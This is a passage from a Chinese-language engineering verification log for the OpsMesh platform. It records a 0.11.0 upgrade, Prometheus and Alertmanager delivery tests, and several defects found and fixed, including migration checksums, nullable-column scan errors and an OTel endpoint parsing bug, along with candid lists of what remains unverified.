业务侧单独一条 `increase(business_metrics_series_dropped_total[30m])`。compose 与 chart 两份同步
（镜像对账测试自动跟上：10 条逐条一致）。

**折叠与告警是真的发生了**：对 task-svc 打 2400 条不同路径（匀速 28/s，避开 `IP_RPS=30` 的默认限流；
顺带实测到 3000 条突发里 2879 条被限流器 429 掉，而限流器包在指标中间件**外面**，
所以被拒的请求不进指标——这条链路本身是健康的），服务侧
`http_metrics_series 2001 / http_metrics_series_dropped_total 488`，
随后 `OpsMeshMetricsCardinalityFolding` 先 pending、5 分钟后 **firing**：

```
job=task-svc  value=488.48  activeAt=2026-10-01T23:53:23Z  state=firing
```

同组的 `OpsMeshBusinessMetricCardinalityFolding` 保持 inactive（业务侧确实没折叠）——
说明这条告警不是"恒真"，它跟着事实走。

**新增运行时门禁 §7c**（`verify-runtime.sh`）：读 `/api/v1/rules?type=alert`，
只要有规则 `health≠ok` 或 `lastError` 非空就判红，并在规则数为 0 时判红（拒绝空转）。
三个输入自证：真机修好的规则 → rc=0；注入一条 `health=err` → rc=1 并打印 group/alert/lastError；
空规则集 → rc=1。这一节把"规则在文件里存在"与"规则在 Prometheus 里可用"分开了，
以后任何人写出同类规则，部署自检就会拦住。

仍未覆盖的（别再写成已验证）：

1. 只在**单个服务 + 单个 Prometheus** 上跑过，没有起完整 12 服务 compose 栈——
   本机原有一个 0.9.x 的 `opsmesh` 项目仍在运行（controlplane/device/gpu/portal/task + mysql/redis/loki），
   升版会重建它并动到那些卷，属于要用户点头的动作，所以没做。
2. 因此 `verify-runtime.sh` 整脚本（含 §5b 的 12 服务指标内容、§6 的 12 服务健康、§7 的 13 目标）
   **没有跑过一次完整绿**；本轮只单独验了 §7c 的判定逻辑与 §7 的目标清单在真实 Prometheus 上成立。
3. 其余 8 条新告警没有逐条触发（需要各自的真实事件：写库失败、外部通知失败、内存淘汰、
   500 条决策历史）。已验证的是：它们引用的序列在真实服务上存在、规则本身 health=ok 且能被评估。
4. Alertmanager 仍不在出厂栈里——firing 只到 Prometheus 的状态面，没人被通知（§23 / 任务 #52）。

## 30. 把本机存量卷升到发布版 0.11.0：一次部署路径的总清算（2026-10-02）

用户点头之后做的两件事：**Alertmanager 进出厂栈**（#52）与**存量卷升版 + verify-runtime 整脚本**（#53）。
后者才是本轮真正的收获：它一次性暴露了 4 个"发布版跑不到、CI 也跑不到、只有真升级才会遇到"的缺陷，
并且顺手证明 `verify-runtime.sh` 里有 5 处判据本身是错的。

取证口径先说清：13 个镜像全部 `docker pull` 自 `ghcr.io/levango7/*:0.11.0`（发布产物），
不用本地重建冒充；控制面短暂换成本地构建的**修复镜像**只为验证修复本身，验证完换回发布版。

### 30.1 头号缺陷：防篡改闸把存量部署 brick 掉

第一次 `deploy.sh up` 的结果是控制面无限 crash-loop：

```
[store] 迁移致命错误（不重试，立即拒绝启动）: migration 1 (001_initial.sql) checksum mismatch:
recorded=43c39a49… expected=c2c92b63… (迁移文件已被篡改，拒绝启动)
```

逐条比对 19 个迁移的指纹后：**17 条不一致**，不是偶发。三条独立证据把它定性成"构建习惯污染"而非篡改：

1. 库里 `applied_at = 2026-09-24`，是**本地构建的 `-sim` 镜像**建的库；
2. `git rev-list --all -- internal/store/migrations/001_initial.sql` 里**没有任何已提交版本**算得出 `43c39a…`；
3. `43c39a…` 精确等于同一文件**换成 CRLF** 的 sha256。

根因是一行缺失的 `.gitattributes`：go/sh/yml/yaml/md/tpl 都钉了 `eol=lf`，**`*.sql` 没有**。
于是 Windows 检出给出 CRLF 的迁移文件，本地构建把它编进镜像（`embed`），首启写库时把
CRLF 指纹记进 `schema_migrations`；此后跑官方（LF）镜像就必然撞闸——而且闸的语义是
"确定性故障 ⇒ fatal 不重试"，**没有任何受控的再基线出口**，运维只剩"手改数据库"这一条野路子。

三道修法（缺一不可）：

| # | 修法 | 单独存在的不足 |
|---|---|---|
| ① | `.gitattributes` 补 `*.sql text eol=lf` | 只挡未来检出，救不了已被污染的存量库 |
| ② | 指纹改为**行尾与 BOM 无关**（`normalizeMigrationContent` 后再 sha256） | 只让**新**记录一致，存量库记录的仍是旧 CRLF 值 |
| ③ | 识别 `legacyCRLFChecksum` 后**一次性、留日志的再基线**；其它任何不符照旧 fatal | 没有①②就会一直靠再基线兜底，等于纵容行尾漂移 |

**A/B 对照（把"确实是它"这件事钉死）**：把台账改回 CRLF 时代的 17 个值后——

| 镜像 | 结果 |
|---|---|
| 发布版 `opsmesh/controlplane:0.11.0` | `Restarting (1)`，日志 `迁移致命错误…checksum mismatch recorded=43c39a49…` |
| 同一库 + 含修复的镜像 | `Up (healthy)`，日志逐条打出 **17 条**「已再基线为行尾无关的规范值」WARN |
| 再基线后再换回发布版 0.11.0 | `Up (healthy)`，**0 条**再基线 WARN（幂等，且发布版→发布版本来无恙） |

台账最终与发布版规范指纹 19/19 一致。测试两道：
`TestMigrationChecksum_LineEndingAgnostic`（纯逻辑，钉"行尾不同指纹必须相同"与"改语义必须不同"），
`TestRunMigrations_RebaselinesLegacyCRLFChecksum`（真 MySQL：植入遗留指纹→必须自愈；再植入随机指纹→必须仍 fatal）。

### 30.2 升级路径不补新服务的库

`init-databases.sql` 只挂在 `/docker-entrypoint-initdb.d/`，**仅在空数据目录执行**。三域转正新增的
`opsmesh_incident` / `opsmesh_runbook` 在存量卷里不存在，而两服务是 fail-fast（不静默退回内存），
症状就是"新版本容器起不来"。修法 `ensure_service_databases()`：每次 `up` 幂等重放建库脚本，
并用 `SHOW DATABASES` **按观察值**核对每个库真的在（不信退出码），实测输出
"微服务库齐备（按 init-databases.sql 核对 7 个，存量卷升级同样补齐）"。
顺带把该脚本头部那句"建库是一次性动作"的注释改成实话——它正是这次踩空的假设。

### 30.3 "热加载成功"原来不可信：bind mount 跟的是 inode

`deploy.sh` 只 `POST /-/reload` 并打印"已热加载"。本轮加了 `alerting` 段与三个新 job 之后：
reload 返回 200，但 `/-/config` 里没有 `alerting`、`activeAlertmanagers` 为空。
原因是宿主文件被整体重写时 inode 改变，而 bind mount 跟 inode ⇒ 容器看到的还是旧文件，
reload 读的是那份旧文件，**当然成功**。`--force-recreate` 之后 18 个 job 全部在抓取面上。

于是 `verify_prometheus_effective_config()` 取代那句自我表扬：把 prometheus.yml 声明的 `job_name`
与运行中的 `/api/v1/targets` 逐个对账，缺则重建容器再核一次，仍缺即判失败。
写这个函数时它自己也先红了一次：`sed` 的 BRE 写法 `"\{0,1\}"` 在这台 Git-Bash 上抽不出任何
`job_name`——因为函数对"解析结果为空"**主动判红**而不是静默通过，缺陷当场暴露（改 `sed -E`）。
这条留给以后：**新写的核对逻辑必须自带"我是不是什么也没解析到"的判据。**

### 30.4 Alertmanager：三跳送达各自有观察点

出厂交付以前是"有规则、有 firing、无人收到"。现在：compose 起 `alertmanager`（仅绑 `127.0.0.1:9094`）、
`prometheus.yml` 的 `alerting` 段生效、`deploy.sh` 的分组启动把它带上并 `wait_for_healthy`
（原来分组启动漏了它，即使装了也不会被起来）。配置不写死而是渲染——
Alertmanager **不读环境变量**，仓里放死配置等于放一个假的外发能力：模板 + `render_alertmanager_config()`
读 `.env` 的 `ALERT_WEBHOOK_URL` / `ALERT_WEBHOOK_BEARER` 生成 `deploy/docker/generated/alertmanager.yml`
（0600 + `.gitignore`），没配 URL 时**大声 WARN**，`bearer` 为空时整段省略（AM 对空 bearer 直接报错）。

过程中真实 AM 帮我们抓了两个错：
① 键名写成 `webhook:` 而非 `webhook_configs:`——YAML 合法、路由引用检查也过，AM 报
`field webhook not found in type config.plain` 拒绝加载；于是渲染校验加了 receiver 集成键名白名单。
② `${ALERTMANAGER_CONFIG:-generated/alertmanager.yml}` 少 `./` 前缀被 compose 当**命名卷**
（"refers to undefined volume"），由门禁 §4 就地判红。

门禁 §15 把这条链路钉住（alerting 未注释 / compose 有 AM / 挂的是渲染物 / deploy.sh 调用渲染且失败即中止 /
`generated/` 不入库 / 默认配置去占位后合法且含 inhibit）；`verify-runtime.sh` §7d 在运行时逐个观察三跳。
**未做的**：没有真实可达的 webhook 收件端，所以"告警真的落到群里"仍未端到端验证——只验到
渲染物被真实 AM 接受（含/不含 bearer 两份）、Prometheus 有活动 AM 端点、未配置时明确 WARN。

### 30.5 `verify-runtime.sh` 的 19 条红里，15 条是脚本自己的锅

| 症状 | 根因 | 修法 |
|---|---|---|
| §5b 12 个服务"TYPE 不对 / 缺 service_info / 缺 active_connections" | `svc_port` 把 `task-svc`→`TASK_SVC` 后又拼 `_SVC_HTTP_PORT`，得到 `TASK_SVC_SVC_HTTP_PORT`；端口为空 ⇒ 读空正文 ⇒ 全判红 | 键名改回 `${SVC}_HTTP_PORT` |
| §5b/§6 三域红、其它绿 | `env_val` **只接一个参数**，调用点写的第二参数（默认端口）被静默吞掉；`.env` 缺 `INCIDENT/RUNBOOK/AUTOSCALER_SVC_HTTP_PORT` 时拿到空端口 | `env_val KEY [DEFAULT]` |
| §4c "未返回 mustChangePassword=true" ×3 | 判据把"首登"写死；存量库里 admin 早已改密（`must_change_password=0`），必然假红 | 以**库里的标记**为独立观测量，断言 API 与之双向一致（两条分支都是硬判定） |
| §15 "/version 与 .env 不一致" | `.env` 存不带 `v` 的镜像 tag，构建期注入的是带 `v` 的 git tag，字符串相等必假红 | 只归一化前导 `v`，不做模糊匹配 |
| §7d "AM 不健康"（其实 healthy） | `/-/healthy` 成功时**响应体为空**，用 grep 文本判健康判不出来 | 改判 HTTP 状态码 |

顺带一条反向确认：`operator` 仍用预置口令 ⇒ 库里标记为 1、admin 改过 ⇒ 0，
说明 P0-1 那套强制改密在 **SQL 后端也确实生效**（以前只有内存后端被断言过）。

### 30.6 结果与仍未覆盖

- `deploy.sh up --no-build -y`：**DEPLOY_RC=0**，13 个服务全部 healthy，冒烟全过，18 个抓取目标 0 DOWN；
- `verify-runtime.sh`：**PASS=124 / FAIL=1**，唯一那条红是我自己灌出来的 `OpsMeshMetricsCardinalityFolding`
  （`job=task-svc`，把 HTTP 时序上限打穿后的真告警，`value≈490`），它同时是**送达链的活证据**：
  Prometheus 里 firing、Alertmanager `/api/v2/alerts` 收到同一条且 `inhibitedBy/silencedBy` 均为空。
  随 30m 窗口自然 resolve——不是缺陷，也不去掩盖；`WARN` 6 条均为"事件尚未发生/需真实流量"类，逐条写明原因；
- **`deploy.sh smoke` 原来在健康栈上会中途退出**（新发现，两个独立问题）：
  ① 它是**裸调用** `run_smoke_tests`，errexit 真的生效，而 4b 那段
  `down_jobs="$(… | grep -o '"job":"…" | …)"` 在**没有 DOWN 目标（好情况）**时 grep 返回 1，
  紧跟的 `[ -z "$down_jobs" ] && break` 在坏情况下也返回 1 ⇒ 健康栈跑到 4b 就 rc=1 中断，
  后面的微服务检查根本不执行；`do_up` 写成 `if ! run_smoke_tests` 恰好把这个问题整段遮住了。
  ② 冒烟清单只有 9 个服务，三域转正后新增的三个从未加入——与 prometheus.yml、verify-runtime §6
  同一类"转正后清单落后"。两处都已修，修完 `deploy.sh smoke` rc=0 且 12/12 服务逐个通过。
- `validate-deploy-assets.sh`：**PASS=42 / FAIL=0 / SKIP=1**（SKIP 是 kubeconform 离线取不到 schema）；
- `golangci-lint run ./...` 0 issues、`gofmt -l .` 空、契约测试与 store 测试全绿。

仍未覆盖，写清楚免得下轮误读：① 真实 webhook 收件端未做端到端；② K8s 侧不做送达断言
（chart 明确复用集群自带的 Alertmanager）；③ 其余 8 条新告警仍未逐条真实触发；
④ 数据保全只核到 `users/tasks/devices` 三个计数与建库数（6→8），没有做全量行级比对。

---

## 31. 2026-10-02（第三次）外发投递端到端跑通；代价是当场抓到三个缺陷

§30 末尾留的"仍然未做"是同一件事：Alertmanager 往**真实渠道**推那一段没有活证据。本轮把它跑完了，
三个缺陷都是这条链顺带抓出来的——共同形态仍然是本项目反复登记的那一句：
**"看起来配好了"与"客户真的收到了"之间，每一跳都要有独立观测量**。

### 31.1 端到端时间线（本机 UTC+8，一次性 HTTP 收件端）

收件端是仓库外的临时容器（`python:3.12-slim` + 58 行 stdlib 服务器），接进出厂网络
`opsmesh-monitoring`、别名 `alert-sink`、不落宿主端口；载荷逐条落盘到宿主目录，判定面是
**收件端收到了什么**，不是任何一环的退出码。

| 时刻 | 事件 | 观测量 |
|---|---|---|
| 22:40:04 | `docker stop opsmesh-aio-svc` | 容器 stopped |
| 22:40:37 | 规则 `ServiceDown` 转 active | `/api/v1/rules` `activeAt=14:40:37.813Z` |
| 22:41:37 | 满足 `for: 1m` ⇒ firing | 载荷 `startsAt=14:41:37Z`（= activeAt + 1m） |
| **22:42:07** | **收件端收到 firing** | `POST /alert`、`User-Agent: Alertmanager/0.27.0`、`Authorization: Bearer <测试 token>` 原样送达 |
| 22:43:55 | 服务起回来 | `health=healthy`，随后 `up{job="aio-svc"}=1` |
| **22:47:07** | **收件端收到 resolved** | `status=resolved`（证明 `send_resolved: true` 真的生效，不是配了不响） |

载荷原文关键字段（`version=4`）：`receiver=default`、
`groupKey={}/{severity="critical"}:{alertname="ServiceDown", job="aio-svc", severity="critical"}`、
`labels={alertname, cluster=opsmesh-prod, environment=production, instance=aio-svc:8108, job=aio-svc, severity=critical}`、
`annotations.summary="Service aio-svc is down"`、`generatorURL` 可点回规则。
中间两跳也各自可观察：Prometheus `/api/v1/alertmanagers` 的
`activeAlertmanagers=[http://alertmanager:9093/api/v2/alerts]` 且 `droppedAlertmanagers=[]`；
AM `alertmanager_alerts_received_total{status="firing"}=2`。

> 顺带修正一个标签口径：`job` 的值是 `aio-svc` 而不是 `opsmesh-aio-svc`（prometheus.yml 里
> `job_name` 就是这么写的）。我的第一版轮询脚本按 `opsmesh-aio-svc` 过滤，于是"什么都没抓到"——
> 这是脚本的错，不是链路的错；两处判定面对不上时，先怀疑脚本。
> 第二版脚本又被 AM `/api/v2/alerts` 的响应形状绊崩一次：那里的 `status` 是**对象**
> （`{"state":"active","inhibitedBy":[],"silencedBy":[]}`）而不是字符串。

### 31.2 缺陷 A｜客户一填 `ALERT_WEBHOOK_URL` 就得到崩溃重启的 Alertmanager

`render_alertmanager_config()` 生成的 bearer 段写成 `http_headers:`，而 `prom/alertmanager:v0.27.0`
不认这个键。真机表现不是"配置不生效"而是 **配置加载失败 → 容器 restart 循环**：

```
caller=coordinator.go:118 level=error component=configuration msg="Loading configuration file failed"
  err="yaml: unmarshal errors:\n  line 38: field http_headers not found in type config.plain"
```

这条缺陷能连过两轮，是因为它**在 YAML 层完全合法**：`deploy.sh` 的 python 校验只核 receiver 层的
键名（`webhook_configs` 之类），没往下核条目层的键名。

修法不是查文档，而是用**同一镜像里的真二进制**逐键实测（`amtool check-config`，权威且免费）：

| webhook 条目层的键 | v0.27.0 判定 | 备注 |
|---|---|---|
| `url` / `send_resolved` / `max_alerts` | ACCEPT | |
| `http_config.authorization.{type,credentials}` | ACCEPT | 正确的 bearer 写法 |
| `http_config.basic_auth` | ACCEPT | |
| `http_headers` | REJECT | 上一轮我用的写法（<0.22 旧名） |
| `headers` | REJECT | 我先"改对了"的写法，其实也错 |
| `timeout` | REJECT | **与预期相反**：印象里文档有它 |
| `http_config.authorization.credentials=""` | ACCEPT | 于是"空 bearer 会报错"那句旧结论作废 |

出厂渲染结果改为 `http_config.authorization` + `max_alerts: 512`；渲染函数另加值的形状校验
（URL / bearer 含双引号或控制字符 ⇒ 装完当场报错，不再生成一份被截断的 YAML）。
CHANGELOG 里上一轮那句"AM 对空 bearer 直接报 `expected type string, got object`"已就地标注作废：
省略空 bearer 段的真实理由是"不给收件端发一个空 Bearer 头"，属语义选择而非加载失败。

### 31.3 缺陷 B｜`/api/v1/alerts` 在真机 MySQL 上返回空列表，而没有任何地方报错

发现路径很偶然：为写投递证据而起的服务，日志里每 10 秒一条

```
[store] Alerts 扫描失败: sql: Scan error on column index 9, name "silenced_until":
  unsupported Scan, storing driver.Value type <nil> into type *time.Time
```

累计 **1844 次**（近 10 分钟 50 次）。根因：`migrations/001_initial.sql:134-148` 的 `alerts` 表
**没有一列带 NOT NULL**，写入侧统一走 `nullString()/nullTime()`（零值 ⇒ NULL），而
`internal/store/sql_alerts.go` 的两个读点把 `silenced_until` / `updated_at` / `created_at`
直接 `Scan` 进 `time.Time`。NULL 进值类型会让**整行**失败，而这两个函数对失败分别是
`continue` 与 `return nil`——症状因此不是报错而是**数据凭空消失**：库里 1 条告警，
`opsmesh_alerts_active 0`。客户视角就是"告警页是空的"，而 `Alerts()` 的调用点（含 /metrics 装配、
告警列表、ack/silence 定位）全部静默拿到空集。

修法：两个读点逐列换成 `sql.NullString` / `sql.NullTime`（不只时间列）。A/B（同一台机器、同一份存量卷）：

| | 出厂镜像 `opsmesh/controlplane:0.11.0` | 本地修复镜像（commit `493b318-scanfix`） |
|---|---|---|
| `opsmesh_alerts_active` | 0（库里 1 行） | **1** |
| 近 10 分钟 `Alerts 扫描失败` | 50 | **0** |

换回出厂镜像后两项立刻复发，所以这不是环境抖动而是代码差异。

### 31.4 缺陷 C｜"被吞掉的错误只有这个指标看得见"这句话本身是假的

`docs/td60-decision-2026-09-26.md` §6 第 1 条写"已用 `opsmesh_store_write_failures_total` +
`/api/v1/admin/store-failures` 让存量吞错点全部可见"。真机读数：日志 1844 次吞错，
**同一时刻抓取面该指标 = 0**。原因在装配位置：`SetStoreFailures` 只出现在
`support_endpoints.go` 的 `renderPrometheus()`（诊断包 `metrics.txt` 路径），而 `/metrics` 的
**抓取路径**走 `writeMetricsBody()`——它推 `SetAgents` 与 `SetAppGauges`，从不推吞错计数。
两条路径的注释还自称"复用与 /metrics 相同的渲染路径"，那句话当时也不成立
（诊断包路径反过来漏推 app gauges）。

修法：抽出 `metricsBody()` 作为两条出口的**唯一装配**（含 `StoreFailureStats()` 推送），
`writeMetricsBody` 与 `renderPrometheus` 都只调它。活体证明指标真的会动：临时
`RENAME TABLE opsmesh.alerts → alerts_probe55` 制造读失败，45 秒内抓取面
`opsmesh_store_write_failures_total` 由 `0 → 5`（每 10 秒一次）；改名还原后按
`SELECT COUNT(*)` 与指标两侧核对，行数与告警仪表复原。

td60 那条结论已就地加更正并保留原文——它示范的正是本项目反复登记的形态：
**可见性通道本身也需要被验证**。

### 31.5 本轮新增的门禁与变异（每条都证明"删掉修复就红"）

| 门禁 | 位置 | 变异输入 | 结果 |
|---|---|---|---|
| 渲染后校验扩到 webhook 条目层 | `deploy.sh` `render_alertmanager_config()` | 写回 `http_headers` | 报错并中止部署（且不再把校验器输出丢进 `/dev/null`） |
| §15 第 ⑥ 项：真 amtool 校验渲染结果 | `validate-deploy-assets.sh` | 合成 `.env` → 调产品自己的渲染函数 → `amtool check-config` | 好配置 ACCEPT；`http_headers` 样本 REJECT（若 ACCEPT 则判红"本节在空转"） |
| alerts 可空列 MySQL 回归 | `internal/store/sql_alerts_null_test.go` | `sql.NullTime` 退回 `time.Time` | **判红，错误文本与生产日志同一条**（`column index 9 … silenced_until`） |
| 抓取面必须推吞错计数 | `internal/controlplane/metrics_store_failures_test.go` | 摘掉 `SetStoreFailures` | 判红（渲染值仍是哨兵 12345） |
| 两条出口序列集合一致 | 同上第二条测试 | 任一条路径少推一组仪表 | 判红；并自检"解析到的序列名 < 10 即空转" |
| §7e 外发落地 | `verify-runtime.sh` | 停掉收件端容器 + 往 AM 注入合成告警 | 判红："请求级失败 12 次"，并打印 `grep 'Notify attempt failed'` 定位指令 |
| §8b 存储层吞错（日志 × 指标交叉） | `verify-runtime.sh` | 直接在**出厂镜像**上跑 | 两条都红（50 次 / 指标 0，并指出两者矛盾）；修复镜像上两条都绿 |

§7e 顺带纠正两个判定面：① §7d 的 `grep -q 'webhook'` 会泛匹配 AM 回显的整份生效配置，
收紧为 `webhook_configs:`；② **传输层失败（DNS 解析不了 / 连不上 / 超时）只进
`alertmanager_notification_requests_failed_total`**，而按 HTTP 状态归类的
`alertmanager_notifications_failed_total` 会一直是 0——只看后者就是"配了 = 收到了"的假绿，
所以两个都判。

也登记一处我自己写进门禁的缺陷：§7e 初版调用了 `skip()`，而 `verify-runtime.sh` **没有这个辅助函数**
（只有 ok/bad/warn/sec）。因为脚本没有 `set -e`，症状只是一行 `skip: command not found` 然后继续跑完
——"门禁自己坏掉但不吭声"。已改用 `warn` 并复跑整脚本确认（`command not found` 计数 0）。

整脚本状态（出厂镜像 + 出厂默认 AM 配置）：`PASS=124 / FAIL=3`，其中
`§1b otel`（见 31.6）、`§8b` 两条是本机已确诊的真缺陷，`§7d WARN + §7e WARN` 是出厂默认的
诚实表述（没有外发通道）。修复镜像上 `§8b` 两条转绿。

### 31.6 环境侧一条（不是产品缺陷，但会咬到企业客户的 Windows 安装）

Docker Desktop 重启后，`opsmesh-otel` 变成"容器 Up、健康检查过、**四个宿主端口其实没发布**"，
`verify-runtime.sh` §1b 判红。显式 `--force-recreate` 才把真因逼出来：

```
Error response from daemon: ports are not available: exposing port TCP 127.0.0.1:4317 -> 127.0.0.1:0:
  listen tcp4 127.0.0.1:4317: bind: An attempt was made to access a socket in a way forbidden by its access permissions.
```

`netsh int ipv4 show excludedportrange protocol=tcp` 显示 **4311–4410 整段被系统保留**
（winnat/Hyper-V 重启后抢占），4317/4318 落在段内，而 `netstat` 看是"空闲"。含义两条：
① `deploy.sh` 的宿主侧端口预检**看不见**这种"保留但没人用"的端口；
② 重启后的存量栈可能出现端口静默失效的形态，§1b 正是为此存在（本轮是它第二次抓到真事）。
本机处置：`.env`（不入库）把 `OTEL_GRPC_PORT/OTEL_HTTP_PORT` 挪到 14317/14318，容器内仍是
4317/4318，服务间调用不受影响；栈恢复 `21/21`、otel 四端口 `OPEN`。文档 §1.1.1 已写入这条前置与处置。

### 31.7 恢复出厂形状与残留核对

`.env` 的两个 `ALERT_WEBHOOK*` 键与临时收件端容器均已撤除（与备份 `env.before54` 比对一致），
AM 重新渲染为"合法但无外发"并通过 `amtool check-config`；`/api/v2/status` 里 `webhook_configs`
不存在、`/api/v2/alerts` 空；临时容器 0、临时 MySQL 用户 0（按 `SELECT … FROM mysql.user` 核对）、
临时库 0（按 `SHOW DATABASES` 核对——第一次删因反引号穿过 bash 双引号被本地 shell 吃掉而**静默没执行**，
复核才发现残留库，所以这一节结论一律看观察值而不是退出码）。业务库 8 个完好。
本地另留了两个镜像标签以便复核：`opsmesh/controlplane:0.11.0-scanfix`（修复版）与
`:0.11.0-published`（出厂版），运行中的栈指回出厂版。

**仍然未做 / 残留**：

1. 真实渠道（飞书 / PagerDuty / 邮件）的投递仍未验证——本轮是自建 HTTP 收件端，能证明
   "AM 会发、头会带、resolved 会发"，不能证明"某个 SaaS 接受这个载荷形状"。
2. `alertmanager.yml.template` 只支持 webhook 一种收件端；PagerDuty/邮件等需要 AM 侧配置块，
   目前仍走控制面自带的 `OPSMESH_ALERT_WEBHOOK_URL` 单渠道路径（**两套渠道并存**这件事要写清）。
3. "全列可空 + 值类型 Scan"这一形态在 `internal/store` 里是否还有第二处：本轮只交叉核对过
   `nullTime()` 的写入点与读侧（`devices.last_result_at`、`sql_m2.go` 的 `end_at` 已用 `sql.NullTime`，
   `leader_lease.expires_at` 由代码保证非零），**没有逐列穷举**；§8b 补上了"现场有吞错就报红"这一层，
   静态穷举仍是待办。
4. 出厂规则里还没有引用 `opsmesh_store_write_failures_total` 的告警（指标刚证明会在抓取面动；
   加规则要同步 Helm 镜像与 §15 契约测试，另开一轮）。
5. K8s 路径继续依赖集群自带的 Alertmanager（chart 不另起一套），本轮的送达断言只覆盖 compose 栈。

---

## 32. 2026-10-04｜#57 外发腿活体：链是通的，代价是当场抓到三条"线上从未生效"

§31 末尾"仍然未做"的第一条（alert-svc 的 PagerDuty 外发腿）本轮跑完了。
结论先给：**这条链本身是通的**——三条动作（trigger / acknowledge / resolve）都经真 gRPC 线路
进来、真评估命中、真落 MySQL、真发到外部端点，且失败侧的指标、日志、出厂告警三层都齐。
但为了造出一条真告警而走过的每一跳都抓出了缺陷，其中两条的性质比"外发腿没验过"严重得多：
**它们的症状是"一切正常"，而实际上有一条通道从来没通过**。

### 32.1 验证装置与判定面

| 部件 | 形态 | 为什么这样做 |
|---|---|---|
| 被测代码 | 从 main HEAD 现编的 `opsmesh/alert-svc:57verify`（镜像 ID 逐次记录） | 出厂的 `0.11.0` 镜像不含 #60 的真实评估，造不出"带读数才命中"的告警 |
| 部署形态 | `docker-compose.prod.yml` + 一次性覆盖层（只改 image 与 `PAGERDUTY_*` 三项） | **不动 `.env`**：那里存的是真实密钥，改它就有"忘记回滚"的暴露面；compose 的 environment 按键深合并，DSN/端口/健康检查/资源限制全部继承出厂值 |
| 调用入口 | 静态 gRPC 客户端（生成的 typed client + 真 codec），打宿主发布的 `127.0.0.1:50053` | 本机没有 grpcurl；同时这条路径顺带复验了 #59（pb 生成物真能过线路） |
| 收件端 | 自建假 PagerDuty（挂在 `opsmesh-backend`、别名 `pagerduty-mock`），逐条落盘并**按公开契约校验载荷** | 判定面是"对端收到了什么"，不是任何一环的退出码 |
| 模式开关 | 端点读 `MODE` 文件：`ok` / `503` / `hang` | 同一实例上同时验成功腿与失败腿，不需要重建容器 |

装置的自检：先用一条**故意非法**的载荷（ack 带 `"severity":""`）打假端点 ⇒ 它回 400 并写明
`INVALID payload.severity=""`。校验器本身有牙，后面的"check= OK"才是证据而不是默认值。
诚实边界：这台校验器是我按 PagerDuty 公开文档复述的**自己的实现**，不是 PagerDuty 的服务端；
它证明载荷形状符合公开契约，不证明"真实 SaaS 接受了它、on-call 真的被叫醒"（仓库内无集成密钥）。

### 32.2 缺陷 A（P0）｜可空列把整行吞掉：告警写得进去、读不出来

现场症状是探针的 `get` 回 `NotFound`，而同一秒数据库里那条行确实在：

```
[store] Alert 查询失败: sql: Scan error on column index 3, name "agent_id":
        converting NULL to string is unsupported
```

`alerts` 表除 `alert_id`/`tenant_id` 外**全部可空**，写侧对空字符串一律走 `nullString()` 落成 NULL，
而读侧把这些列 Scan 进 `string`/`time.Time`。database/sql 遇 NULL 直接报错，于是：
`GetAlert` 恒 NotFound、`ListAlerts` 恒空、`AckAlert` 里"取 device_id 当 source"拿到 nil ⇒
**外发给 PagerDuty 的 `payload.source` 是空的**（值班看到"有个告警被确认了"，不知道是哪台机器）。
健康检查、RPC 返回码、指标全部正常——典型的"接口活着、数据没了"。

修法与门禁（`services/alert-svc/internal/store/`）：

- 读侧改成**全列 `sql.Null*`**，两张表共用一份映射（`nullAlert` / `nullAlertRule`），
  列清单与 Scan 目标各只有一个出处。
- 三条静态对账（无真库也能跑，CI 每次都跑）：① SELECT 列数 == Scan 目标数；
  ② `schema.sql` 里没写 NOT NULL 的列，读侧目标必须是 `sql.Null*`；
  ③ `initSchema` 内联 DDL 与 `schema.sql` 的列集合一致（同一段结构写了两遍，本身就是漂移面）。
  `PRIMARY KEY` 按 MySQL 语义视作 NOT NULL，否则门禁会把一张健康的表判成缺陷——这条是写测试时
  自己被绊了一下才补的。
- 真库回归用仓内既有约定 `OPSMESH_TEST_MYSQL_DSN`，**CI 的 services job 已经提供这个变量**
  ⇒ 它在流水线里是真跑，不是"写了但没人跑"。
- 变异验证五条全部判红：删一个 Scan 目标、把 `comment` 列从内联 DDL 里改掉、
  基线函数改空实现、启用分支里不调用基线、`omitempty` 摘掉。
- **"改动前真的读不出来"用 worktree 单独证了一次**：在 `c5d9fa2`（修复前）上跑同一份真库用例，
  得到 `Alert(...) 返回 nil —— 整行被可空列的 Scan 错误吞掉`；在修复后的代码上同一用例绿。
  A/B 都做过，才敢说这不是我对修复的自我安慰。

§31 残留第 3 条预言的就是这一类（"全列可空 + 值类型 Scan 未逐列穷举"）。它当时命中的是控制面的
`internal/store`，这次是 alert-svc 自己的 store——**同一个形态在第二个库里第二次发生**。
控制面侧的逐列穷举仍未做，已按事实登记为技术债（不是"已解决"）。

### 32.3 缺陷 B（P0）｜12 个微服务的链路追踪从未到达 collector

假端点不需要日志就能看出来，这条是顺带在 alert-svc 日志里撞见的：

```
traces export: exporter export timeout: invalid target address http://otel-collector:4317,
error info: address http://otel-collector:4317:443: too many colons in address
```

出厂 compose 给 12 个微服务下发的是 OTel 规范写法 `OTEL_EXPORTER_OTLP_ENDPOINT=http://otel-collector:4317`，
而 `internal/otelx` 把整个字符串原样交给 `otlptracegrpc.WithEndpoint`——gRPC 把它当**目标地址**
而不是 URL，于是自己又补了一个 `:443`。alert-svc 4 分钟里刷了 15 条这种 INFO；
控制面/agent 用的是无 scheme 的 `OPSMESH_OTEL_ENDPOINT=otel-collector:4317`，所以只有微服务这一侧全灭。
"出厂栈带链路追踪"这句话在微服务侧从来没成立过。

修法：`normalizeEndpoint()` 剥 scheme、按 scheme 决定 TLS（无 scheme 时保留"443 才 TLS"的旧口径，
不顺手改控制面行为）、剥 path、缺端口补 `:4317`、并用 `net.SplitHostPort` 把
"多冒号/空端口/空主机"这类**在初始化就判掉**（错误一路抛到 `Init`，生产形态 fail-fast）。
刻意不用 `url.Parse`：它会把 `otel-collector:4317` 解析成 scheme=`otel`——恰好把无 scheme 的
旗标形态解析错，这一条写在注释里。

观测量（两条独立）：
- 修复后 alert-svc 日志里 `too many colons|traces export` 命中数 = **0**（修复前同一实例 15）。
- 归因到"是 alert-svc 在发"：静默 60s collector 的 `otelcol_receiver_accepted_spans` 只 +8，
  紧接着 300 次 alert-svc RPC ⇒ **+296**。

顺带登记两条如实口径（见 `docs/operations.md` §4.7）：collector 的 traces pipeline 只接 `logging`
exporter，仓库内没有 Jaeger/Tempo ⇒ 出厂交付能"看到 span 计数"，不能"打开一张调用链图"；
且 `tail_sampling` 对非错误、非慢请求只保留 10%。

### 32.4 缺陷 C（P1）｜第一次失败不报警：increase() 看不见惰性创建的序列

这条推翻了我自己上一轮的判断。§31 里我曾断言"序列不存在 ⇒ 规则会错过第一次失败"，
